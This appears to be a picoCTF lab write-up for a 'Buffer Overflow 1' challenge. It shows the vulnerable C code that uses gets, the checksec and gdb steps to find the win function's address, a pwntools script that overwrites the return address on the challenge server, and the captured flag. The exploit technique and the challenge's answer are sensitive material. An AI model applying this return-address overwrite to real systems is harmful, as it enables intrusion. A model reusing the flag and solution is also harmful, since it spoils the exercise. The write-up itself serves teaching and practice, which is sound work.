# Writeup: Buffer Overflow 1

## Introduction

As the title of the challenge suggests we will be taking advantage of the buffer overflow vulnerability. Specifically we will be taking advantage of the stack buffer variable buf inside of the vuln function. The win function (which contains the code that prints out the flag) is never called, but we can overflow the buffer on the stack of the local function to overwrite the return address located on the stack. 

```
    void win() {
      char buf[FLAGSIZE];
      FILE *f = fopen("flag.txt","r");
      if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
      }

      fgets(buf,FLAGSIZE,f);
      printf(buf);
    }

    void vuln(){
      char buf[BUFSIZE];
      gets(buf);

      printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
    }

```

## Finding Win Function Address

In order to be able to jump to the win function we need to know the address of the win function. First we need to check what kind of restrictions the binary has, in this case I will be specifically looking for whether the binary was compiled with PIE. 

```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable    FILE
    Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   76 Symbols        No    0               3              ./vuln
```

As you can see to binary was not compiled with PIE enabled meaning addresses are consistent across runs. This works to our favor because we can use gdb to find the address of the Win function. Not only that, but we can also see that this binary was compiled with symbols making it easier for us to locate win in gdb.

```
    gef➤  p win
    $1 = {<text variable, no debug info>} 0x80491f6 <win>
```

## Results

Now that we have the address of Win we can use pwn tools to create a script that will allow us to overflow the buffer using the correct offset so that we can overwrite the return address on the stack. I opted to try offsets of various sizes until the return address printed on screen by the program itself was the correct return address. The final script is shown below:

```
    from pwn import *

    p = remote('saturn.picoctf.net', 51045)
    p.recvuntil(b': ')
    offset = b'A' * (44)
    address = 0x80491f6
    print(f'{hex(address)}')
    payload = p64(address)
    p.sendline(offset + payload)
    p.interactive()
```
Finally, we can run the script and deliver the payload to get the flag.

```
    [+] Opening connection to saturn.picoctf.net on port 51045: Done
    0x80491f6
    [*] Switching to interactive mode

    Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
    picoCTF{addr3ss3s_ar3_3asy_6462ca2d}[*] Got EOF while reading in interactive
    $
    $
    [*] Closed connection to saturn.picoctf.net port 51045
    [*] Got EOF while sending in interactive
```

And finally we have our flag!
